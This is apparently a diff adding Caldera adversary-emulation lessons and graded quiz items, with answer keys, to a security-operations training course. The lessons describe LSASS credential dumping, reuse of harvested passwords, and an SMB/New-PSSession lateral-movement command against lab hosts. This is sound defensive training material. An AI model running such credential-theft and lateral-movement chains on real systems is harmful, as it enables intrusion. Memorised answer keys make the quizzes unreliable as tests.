+> 3. Read the **operation report** — per-ability outcome, facts, ATT&CK coverage
+> 4. Use **pause / resume** for multi-day campaigns
+
+## Launching an operation
+
+UI flow:
+
+1. *Operations → Add operation*.
+2. **Name** — descriptive (e.g. `EX-2026-04-002 — FIN6 Compressed on PT-LAB-{04,05,06}`).
+3. **Adversary** — pick from the adversary list (e.g. *FIN6 Compressed*).
+4. **Group** — pick agent group(s) (e.g. `red-initial`, `red-lateral`, `red-impact`).
+5. **Planner** — `batch`, `atomic`, `buckets`, or `look`.
+6. **Obfuscator** — `plain-text`, `base64`, `caesar`. Plain-text for first runs (so the SIEM sees the raw command).
+7. **Jitter** — operation-level beacon randomness (`min,max` seconds).
+8. **Auto-close** — close the operation after final ability completes.
+
+Click *Run*. The operation transitions: created → running → finished.
+
+## The four planners
+
+| Planner | Strategy | When to use |
+|---|---|---|
+| **batch** | Run abilities in YAML order, sequentially | Default. Linear chains. Predictable. |
+| **atomic** | Schedule abilities as soon as their facts are satisfied | Fact-driven chains; abilities can swap order based on what discovers what |
+| **buckets** | Group abilities by tactic; run each tactic's abilities concurrently | Wide-coverage exercises; tactic-level timing |
+| **look** | Find next runnable ability and execute concurrently across agents | Multi-host parallel chains |
+
+The L3's reflex:
+
+- Linear chain on one host → **batch**.
+- Linear chain across multiple hosts → **batch** (still works; one host at a time).
+- Fact-driven chain on one host → **atomic** (so the planner picks based on facts).
+- Multi-host fact-driven chain → **look** (so abilities run concurrently as their preconditions are met).
+- Tactic-level testing (run all CredAccess abilities, then all LatMov) → **buckets**.
+
+## Reading the operation report
+
+The `debrief` plugin renders the report. Key sections:
+
+### Per-ability outcome
+
+| Ability | Status | Output | Time |
+|---|---|---|---|
+| Mshta encoded PS | success | (stdout truncated) | 02s |
+| Registry Run key | success | (stdout) | 04s |
+| LSASS dump | failure | "Access denied" | 12s |
+| Net group enum | success | "found 3 admins" | 03s |
+
+The L3 reads each row's status. Failures — read the output for cause; sometimes EDR caught the technique, sometimes the prereq wasn't met.
+
+### Facts collected
+
+```
+host.user.name = "alice", "bob", "charlie"
+host.user.password = "S0mePass123" (collected by mimikatz ability)
+host.ip = "10.0.5.42"
+remote.host = "10.0.5.43" (the SMB lateral target)
+```
+
+The fact set lets you trace how the chain progressed — which ability discovered what, which downstream abilities consumed each fact.
+
+### ATT&CK coverage
+
+Caldera's `compass` plugin generates a Navigator JSON layer overlaying the chain's techniques. Importable into the public Navigator UI for visualisation.
+
+### Time-to-complete per ability + total chain
+
+The chain's **total wall time** is the L3's primary response-time KPI. Compare to the SOC's measured time-to-detect (TTD) and time-to-respond (TTR):
+
+- If chain completed in 7 minutes and SOC's TTR is 12 minutes — the actor would have completed all phases before response. **Response gap.**
+- If chain completed in 7 minutes and SOC's TTR is 4 minutes — response would have caught the chain mid-flight. **Containment opportunity.**
+
+This delta is what the L3 reports up to leadership: *real* response capacity vs *real* attack speed.
+
+## Pause / resume for multi-day campaigns
+
+For exercises emulating long-running campaigns (e.g. an APT that drips activity over a week), pause the operation between phases:
+
+```
+UI: Operations → <name> → Pause
+```
+
+The agents stop receiving new orders. After the pause window, *Resume*; agents continue from where they left off.
+
+Use case: emulate an actor that runs initial-access on day 1, lateral-movement on day 3, exfil on day 5. Pause between phases to match the real-actor timing; the SOC's response is then measured *across* the campaign, not just within one operation window.
+
+## Worked: an EX log entry from a Caldera operation
+
+```
+EXERCISE EX-2026-04-002
+Caldera operation: FIN6 Compressed on PT-LAB-{04,05,06}
+Started: 14:00 UTC
+Completed: 14:07 UTC
+Total wall time: 7m 12s
+Abilities: 8 success, 0 failure, 0 skipped
+Highest-leverage step (response): T1078.004 (cloud account abuse) - phase 1
+SIEM detection (Tier-1): rule "Suspicious mshta + PowerShell" fired at 14:02 (latency 2m, severity high)
+Containment trigger: not initiated by SOAR
+Response gap: 12-min TTR vs 7-min chain completion → ATT chain completed pre-response
+TuningProposal: TP-2026-04-201 (SOAR auto-isolate trigger on rule X)
+```
+
+## Glossary
+
+- **Operation** — runtime instance of an adversary on a set of agents.
+- **Planner** — the strategy the operation uses to order abilities.
+- **Operation report** — `debrief` plugin's output: per-ability + facts + ATT&CK coverage + timing.
+- **Total wall time** — the chain's real response-time KPI.
+
+## Further reading
+
+- Caldera operation docs — https://caldera.readthedocs.io/en/latest/learning-the-terminology.html#operations.
+- `debrief` plugin — `plugins/debrief/`.
+""",
+    )
+    _add_q(session, m3l6, order=1, kind=QuestionKind.SINGLE,
+        stem_md="An L3 builds an adversary profile where ability 5 (`net group enum`) emits `host.user.name` facts that ability 6 (`SMB lateral move`) requires. The L3 wants Caldera to schedule ability 6 **as soon as ability 5's output produces a matching fact**, rather than waiting for the YAML order. Which planner fits?",
+        options=[
+            {"value": "batch", "label": "`batch` — runs abilities in YAML order, sequentially"},
+            {"value": "atomic", "label": "`atomic` — schedules abilities as soon as their facts are satisfied"},
+            {"value": "buckets", "label": "`buckets` — groups abilities by tactic; runs concurrently within a tactic"},
+            {"value": "look", "label": "`look` — multi-agent parallel; finds next runnable ability across all agents"},
+        ],
+        correct="atomic",
+        explanation_md="**`atomic`** is the right planner. Its strategy is exactly what the question describes: schedule an ability as soon as its requirements (fact dependencies) are met, regardless of YAML order. `batch` is sequential and would wait through the YAML order even if ability 6's facts were ready earlier. `buckets` is tactic-grouped, useful for wide-coverage testing. `look` is the multi-agent variant of atomic, used when the chain spans multiple hosts and concurrent execution speeds up the chain. For a single-host fact-driven chain, `atomic` is the canonical pick.",
+        points=2,
+    )
+
+    # Lesson 3.7 — Multi-host operations
+    m3l7 = _add_lesson(
+        session, mod3, order=7,
+        title="Multi-host operations: lateral movement, fact propagation, agent-to-agent abilities",
+        lesson_type=LessonType.READING, duration_min=22,
+        content_md="""
+> **Learning objectives.**
+> 1. Set up **multi-host operations** with sandcat agents on initial / lateral / impact hosts
+> 2. Recognise **fact propagation** — agent A discovers, agent B consumes
+> 3. Pick the **`look` planner** for parallel multi-agent chains
+> 4. Apply the **agent-removal-after rule** at multi-host scale
+
+## Multi-host topology
+
+A single-agent operation tests host-local TTPs. Lateral / collection / exfil TTPs are inherently multi-host — they need at least two agents to model realistically.
+
+Canonical setup:
+
+- **`PT-LAB-04` (initial-access target)** — Sandcat group `red-initial`. The host the actor's first foothold lands on.
+- **`PT-LAB-05` (lateral target)** — Sandcat group `red-lateral`. The host the actor pivots to after gaining credentials.
+- **`PT-LAB-06` (impact target)** — Sandcat group `red-impact`. The host where the actor encrypts / exfils data.
+
+The operation targets all three groups. Caldera's planner figures out which abilities run on which host based on requirements + group filters.
+
+## Fact propagation across agents
+
+The server stores facts at the *operation* level, not per-agent. So a fact discovered by agent A is available to agent B in the same operation.
+
+Example flow:
+
+1. **Agent A** (PT-LAB-04, group `red-initial`) runs T1003.001 — LSASS dump. Emits `host.user.name = "admin01"` and `host.user.password = "P@ssw0rd"`.
+2. Server records the facts in the operation's fact set.
+3. **Agent B** (PT-LAB-05, group `red-lateral`) runs T1021.002 — SMB lateral. Requires `host.user.name` and `host.user.password`. Server's planner schedules the ability with those facts substituted.
+4. Agent B executes `New-PSSession -Computer PT-LAB-05 -Credential (admin01:P@ssw0rd)`. Establishes session.
+
+The cross-agent fact flow is what makes Caldera's multi-host operations realistic. Without it, you'd be running disconnected per-host atomics — same as ART.
+
+## Agent-to-agent abilities
+
+Some abilities have the requirement *source agent != target agent*. These are the lateral-movement abilities — they explicitly model a chain where agent A pivots TO agent B.
+
+```yaml
+requirements:
+  - plugins.stockpile.requirements.relationship:
+      - source_agent: A
+        target_agent: B
+        relationship: 'must_be_different'
+```
+
+Such abilities run on agent A but their action affects agent B's host. The planner pairs the agents based on the requirement.
+
+## Picking the planner: `look`
+
+For multi-agent chains, **`look`** is usually the right planner:
+
+- Concurrently scans all agents for the next runnable ability.
+- Schedules abilities on the right agent based on group filters + requirements.
+- Faster than `batch` (which runs sequentially) for multi-host chains.
+
+Trade-off: `look` is harder to reason about; ability ordering becomes emergent rather than scripted. For a first multi-host run, use `atomic` (single-agent fact-driven) and break the chain into per-host segments.
+
+## Worked: a 4-step lateral chain
+
+L3 designs a chain:
+
+1. T1003.001 LSASS dump — runs on agent A (group `red-initial`). Emits `host.user.password`.
+2. T1021.002 SMB lateral — runs on agent A targeting agent B's host. Uses `host.user.password`. Establishes session on agent B.
+3. T1018 secondary recon (net group on agent B) — runs on agent B. Emits `remote.host` facts (next target).
+4. T1486 file encryption sandbox — runs on agent C (group `red-impact`). Targets the discovered host.
+
+Adversary YAML:
+
+```yaml
+- id: <uuid>
+  name: 4-step lateral chain
+  atomic_ordering:
+    - <T1003.001 ability uuid — group red-initial>
+    - <T1021.002 lateral ability uuid — pivot from red-initial to red-lateral>
+    - <T1018 recon ability uuid — group red-lateral>
+    - <T1486 sandbox encryption uuid — group red-impact>
+```
+
+Operation:
+- Adversary: 4-step lateral chain.
+- Groups: `red-initial`, `red-lateral`, `red-impact`.
+- Planner: `look`.
+
+Run. The total wall time tells the L3 the chain's real-world speed; the SIEM's response telemetry tells whether the SOC caught it.
+
+## Agent-removal-after at scale
+
+Multi-host operations leave more residual state than single-host. Post-exercise:
+
+1. UI: Agents → Kill all (each group).
+2. Per-host SSH validation:
+   - `pgrep sandcat` returns nothing.
+   - `/tmp/sandcat` removed.
+   - `/tmp/sc-*` directories removed.
+3. Per-host **persistence audit** — any ability in the chain that created persistence (registry Run keys, scheduled tasks, autostart) needs explicit removal.
+4. Reboot each host (paranoid; in-memory state all gone).
+5. Document in the exercise log.
+
+For high-blast-radius operations, the snapshot-and-revert pattern (M2.7) is the safety net. VM snapshot before the operation; revert if cleanup fails.
+
+## Glossary
+
+- **Multi-host operation** — agents on multiple hosts, one operation.
+- **Fact propagation** — facts collected by one agent are available to all agents in the operation.
+- **Agent-to-agent ability** — requires `source_agent != target_agent`; models lateral movement.
+- **`look` planner** — concurrent multi-agent scheduler.
+
+## Further reading
+
+- Caldera multi-host docs — https://caldera.readthedocs.io/en/latest/learning-the-terminology.html#operations.
+- AEL multi-host plans — most plans target 2-4 hosts; useful templates.
+""",
+    )
+    _add_q(session, m3l7, order=1, kind=QuestionKind.SINGLE,
+        stem_md="In a multi-host Caldera operation, agent A (group `red-initial`) runs T1003.001 — LSASS dump. The ability emits `host.user.password` facts. Agent B (group `red-lateral`) is scheduled to run T1021.002 — SMB lateral — which requires `host.user.password`. Where do agent B's required facts come from?",
+        options=[
+            {"value": "agent_b_local", "label": "Agent B's own host's facts only — fact propagation is per-agent"},
+            {"value": "operation_fact_set", "label": "The operation's shared fact set — facts collected by any agent in the operation are available to all"},
+            {"value": "manual", "label": "The L3 must manually copy facts from agent A to agent B between abilities"},
+            {"value": "session_token", "label": "Caldera's session token — facts are derived from the agent's auth identity"},
+        ],
+        correct="operation_fact_set",
+        explanation_md="**The operation's shared fact set.** Caldera stores facts at the *operation level*, not per-agent. So when agent A's LSASS-dump ability emits `host.user.password = \"P@ssw0rd\"`, the server records the fact in the operation's fact set. The planner then sees agent B's requirement `host.user.password` and substitutes the value when scheduling agent B's SMB-lateral ability. This cross-agent fact propagation is what makes multi-host operations *realistic* — without it, you'd be running disconnected per-host atomics (same as ART). The L3's mental model: *abilities are co-operating workers; the fact set is the shared whiteboard.*",
+        points=2,
+    )
+
+    # Lesson 3.8 — Capstone
+    m3l8 = _add_lesson(
+        session, mod3, order=8,
+        title="L3 M3 Capstone — Caldera deployment + ability authoring + multi-host orchestration",
+        lesson_type=LessonType.QUIZ, duration_min=15,
+        content_md="""
+Two-question capstone. Closes Module 3.
+
+Module 4 picks up: **Telemetry quality assessment** — the engineering side of which fields are populated, parser health, ECS coverage. The bridge from emulation results into the data-quality work that makes detection engineering possible.
+""",
+    )
+    _add_q(session, m3l8, order=1, kind=QuestionKind.SHORTANSWER,
+        stem_md="An L3 stands up Caldera via the canonical docker-compose. After server start, the *Plugins* and *Adversaries* sections in the UI show empty. What's the **most likely root cause** + the **one-command fix** (run from the `caldera/` repo root)? Format: `cause / fix`.",
+        options=None,
+        correct=[
+            "submodules not initialised / git submodule update --init --recursive",
+            "submodules / git submodule update --init --recursive",
+            "git submodules missing / git submodule update --init --recursive",
+            "missing plugins / git submodule update --init --recursive",
+            "submodules not pulled / git submodule update --init --recursive",
+        ],
+        explanation_md="**Cause: git submodules not initialised. Fix: `git submodule update --init --recursive`.** Caldera's plugins (stockpile, sandcat, atomic, etc.) live in submodules under `plugins/<name>`. A plain `git clone` (without `--recursive`) leaves those folders empty — the server starts but has no abilities, no adversaries, no agent build pipeline. The recovery is the explicit submodule update; the prevention is `git clone --recursive` from the start (per L3.2). After the submodules pull, restart the server (`docker compose restart`) and the *Plugins* / *Adversaries* sections populate. Note: this is the #1 first-time-install failure for Caldera.",
+        points=2,
+    )
+    _add_q(session, m3l8, order=2, kind=QuestionKind.SINGLE,
+        stem_md="An L3 wants to ship a multi-host operation that emulates a fact-driven, parallel-executable kill chain across **three sandcat agents** on different hosts. The chain has 6 abilities; some can run concurrently as facts arrive. Which Caldera planner is the right pick?",
+        options=[
+            {"value": "batch", "label": "`batch` — sequential, YAML-order"},
+            {"value": "atomic", "label": "`atomic` — single-agent fact-driven; runs one host at a time"},
+            {"value": "buckets", "label": "`buckets` — tactic-grouped concurrent; useful for wide-coverage testing"},
+            {"value": "look", "label": "`look` — concurrent multi-agent scheduler; runs abilities on whichever agent's requirements are met first"},
+        ],
+        correct="look",
+        explanation_md="**`look`** is the right planner for concurrent, multi-host, fact-driven chains. Its strategy: scan all agents, find the next ability whose requirements are satisfied on some agent, schedule it. Multiple abilities can run concurrently across agents. `atomic` is fact-driven but typically used for single-agent chains. `batch` is sequential. `buckets` groups by tactic — useful for wide-coverage testing but not for fact-driven chains. The L3's reflex: *single-host linear → batch; single-host fact-driven → atomic; multi-host parallel fact-driven → look*. Multi-host operations also require the agent-removal-after rule (L3.7) applied per-host at exercise end.",
+        points=2,
+    )
+
+    print(f"  L3: {course.title} — 3 modules, 24 lessons (Module 3 Caldera operations @ proper depth)")
     return course
 
 
